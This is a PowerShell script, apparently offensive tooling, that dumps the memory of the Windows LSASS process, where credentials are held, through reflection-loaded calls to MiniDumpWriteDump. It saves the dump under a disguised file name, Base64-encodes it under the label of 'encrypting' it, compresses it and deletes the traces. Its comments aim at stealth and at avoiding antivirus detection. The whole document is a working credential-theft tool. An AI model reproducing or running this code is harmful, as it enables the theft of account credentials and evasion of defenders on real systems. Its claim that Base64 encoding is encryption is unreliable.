# Variables
$DumpPath = "C:\Users\Public\syslog.dat"
$EncryptedPath = "C:\Users\Public\backup.enc"
$ZipPath = "C:\Users\Public\syslog.zip"
$DumpSuccess = $false

# Function to check if a file exists
function Wait-ForFile {
    param (
        [string]$filePath,
        [int]$timeoutSeconds = 10
    )
    $elapsed = 0
    while (!(Test-Path $filePath) -and ($elapsed -lt $timeoutSeconds)) {
        Start-Sleep -Seconds 1
        $elapsed++
    }
    return (Test-Path $filePath)
}

# Using reflection to dump LSASS in-memory with stealth
Write-Output "[*] Attempting stealthy LSASS dump using PowerShell reflection..."

try {
    $signature = @"
    using System;
    using System.Runtime.InteropServices;
    public class LSASSDump {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        
        [DllImport("dbghelp.dll", SetLastError = true)]
        public static extern bool MiniDumpWriteDump(
            IntPtr hProcess, 
            uint processId, 
            IntPtr hFile, 
            uint dumpType, 
            IntPtr exceptionParam, 
            IntPtr userStreamParam, 
            IntPtr callbackParam
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
"@
    Add-Type -TypeDefinition $signature -Language CSharp

    # Define access rights to avoid triggering AV alerts
    $PROCESS_QUERY_INFORMATION = 0x0400
    $PROCESS_VM_READ = 0x0010

    # Get LSASS process ID
    $lsass = Get-Process -Name "lsass"
    $processId = $lsass.Id

    # Open LSASS process with minimal permissions to avoid detection
    $hProcess = [LSASSDump]::OpenProcess($PROCESS_QUERY_INFORMATION -bor $PROCESS_VM_READ, $false, $processId)

    if ($hProcess -eq 0) {
        throw "Failed to obtain process handle. Insufficient privileges?"
    }

    # Create file to store dump
    $fileStream = [System.IO.File]::Open($DumpPath, [System.IO.FileMode]::Create)
    $fileHandle = $fileStream.SafeFileHandle.DangerousGetHandle()

    # Perform memory dump with minimal footprint
    $result = [LSASSDump]::MiniDumpWriteDump($hProcess, $processId, $fileHandle, 0x00000002, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)

    if ($result) {
        Write-Output "[+] LSASS dump created successfully."
        $DumpSuccess = $true
    } else {
        Write-Output "[!] LSASS dump failed using stealth method."
    }

    # Clean up handles
    $fileStream.Close()
    [LSASSDump]::CloseHandle($hProcess)

} catch {
    Write-Output "[!] In-memory LSASS dump method failed: $_"
}

# Proceed if dump creation was successful
if ($DumpSuccess) {
    Write-Output "[*] Encrypting the dump file..."
    try {
        $bytes = [System.IO.File]::ReadAllBytes($DumpPath)
        $encrypted = [Convert]::ToBase64String($bytes)
        Set-Content -Path $EncryptedPath -Value $encrypted
        Write-Output "[+] Dump file encrypted successfully."

        Write-Output "[*] Compressing the encrypted dump..."
        Compress-Archive -Path $EncryptedPath -DestinationPath $ZipPath
        Write-Output "[+] Compression completed: $ZipPath"

        # Cleanup original dump and encrypted file
        Remove-Item -Path $DumpPath -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $EncryptedPath -Force -ErrorAction SilentlyContinue

        Write-Output "[+] Cleanup completed. Only the compressed archive remains."
    } catch {
        Write-Output "[!] Encryption or compression failed."
    }
} else {
    Write-Output "[!] LSASS dump failed. Exiting script."
}

Write-Output "[*] Done. Check $ZipPath for the final archive if successful."